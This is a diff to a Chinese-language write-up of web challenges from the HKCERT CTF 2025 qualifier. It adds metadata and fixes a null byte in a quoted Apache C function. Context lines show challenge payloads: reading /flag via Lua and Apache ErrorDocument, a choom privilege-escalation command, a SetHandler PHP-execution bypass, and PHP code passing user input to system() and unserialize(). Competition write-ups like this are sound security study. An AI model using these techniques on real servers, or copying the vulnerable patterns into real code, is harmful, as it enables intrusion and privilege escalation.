@@ -71,6 +71,9 @@ prerequisites:
 - JSON5 与 JSON.parse 差异 + 原型链污染
 - ThinkPHP 模板注入 + Apache ap_expr
 - PHP 反序列化 POP 链 + DateTime 异常类
+contest_normalized: "HKCERT"
+contest_year: 2025
+subcategory_guess: "ssrf"
 ---
 # 香港網安奪旗賽HKCERT CTF 2025 資格賽WEB方向Writeup
 
@@ -153,7 +156,7 @@ print(pcall(S3cr3t0sEx3cFunc,"cat /flag"))
 find / -type f -perm -40002>/dev/null
 choom -n0-- /bin/sh -pcat /root/flag
 SetHandler application/x-httpd-ph%{unescape:%70}
-staticconstchar*file_func(ap_expr_eval_ctx_t *ctx, constvoid*data, char*arg){ apr_file_t *fp; char*buf; apr_off_t offset; apr_size_t len; apr_finfo_t finfo; if(apr_file_open(&fp, arg, APR_READ|APR_BUFFERED, APR_OS_DEFAULT, ctx->p) != APR_SUCCESS) { *ctx->err = apr_psprintf(ctx->p,"Cannot open file %s", arg); return""; } apr_file_info_get(&finfo, APR_FINFO_SIZE, fp); if(finfo.size > MAX_FILE_SIZE) { *ctx->err = apr_psprintf(ctx->p,"File %s too large", arg); apr_file_close(fp); return""; } len = (apr_size_t)finfo.size; if(len ==0) { apr_file_close(fp); return""; } else{ if((buf = (char*)apr_palloc(ctx->p, sizeof(char)*(len+1))) == NULL) { *ctx->err ="Cannot allocate memory"; apr_file_close(fp); return""; } offset =0; apr_file_seek(fp, APR_SET, &offset); if(apr_file_read(fp, buf, &len) != APR_SUCCESS) { *ctx->err = apr_psprintf(ctx->p,"Cannot read from file %s", arg); apr_file_close(fp); return""; } buf[len] =' '; } apr_file_close(fp); returnbuf;}
+staticconstchar*file_func(ap_expr_eval_ctx_t *ctx, constvoid*data, char*arg){ apr_file_t *fp; char*buf; apr_off_t offset; apr_size_t len; apr_finfo_t finfo; if(apr_file_open(&fp, arg, APR_READ|APR_BUFFERED, APR_OS_DEFAULT, ctx->p) != APR_SUCCESS) { *ctx->err = apr_psprintf(ctx->p,"Cannot open file %s", arg); return""; } apr_file_info_get(&finfo, APR_FINFO_SIZE, fp); if(finfo.size > MAX_FILE_SIZE) { *ctx->err = apr_psprintf(ctx->p,"File %s too large", arg); apr_file_close(fp); return""; } len = (apr_size_t)finfo.size; if(len ==0) { apr_file_close(fp); return""; } else{ if((buf = (char*)apr_palloc(ctx->p, sizeof(char)*(len+1))) == NULL) { *ctx->err ="Cannot allocate memory"; apr_file_close(fp); return""; } offset =0; apr_file_seek(fp, APR_SET, &offset); if(apr_file_read(fp, buf, &len) != APR_SUCCESS) { *ctx->err = apr_psprintf(ctx->p,"Cannot read from file %s", arg); apr_file_close(fp); return""; } buf[len] ='\\x00'; } apr_file_close(fp); returnbuf;}
 ErrorDocument404%{file:/flag}
 <?phpclassRequestHandler{ public$processor; public$action; publicfunction__construct(){ $this->processor =newclass{ private$handle; publicfunction__construct(){ $this->handle = tmpfile(); } publicfunction__wakeup(){ $this->handle =null; } publicfunctionexecute(){ if(!is_resource($this->handle)) { die("Invalid resource state
 "); } system($_GET['cmd']); } }; } publicfunction__destruct(){ if(!is_array($this->action)) { die("Error: action must be an array"); } $cb=$this->action; $cb(); }}unserialize($_GET['data']);
